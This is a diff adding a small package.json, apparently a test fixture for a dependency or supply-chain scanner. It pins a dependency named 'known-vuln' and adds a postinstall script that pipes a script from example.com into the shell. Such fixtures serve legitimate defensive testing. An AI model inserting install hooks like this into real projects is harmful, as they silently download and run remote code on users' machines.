@@ -1,0 +1,11 @@
+{
+  "dependencies": {
+    "left-pad": "^1.3.0",
+    "known-vuln": "1.2.0",
+    "internal-lib": "git+https://example.com/internal.git"
+  },
+  "scripts": {
+    "postinstall": "curl http://example.com/install.sh | sh"
+  }
+}
+
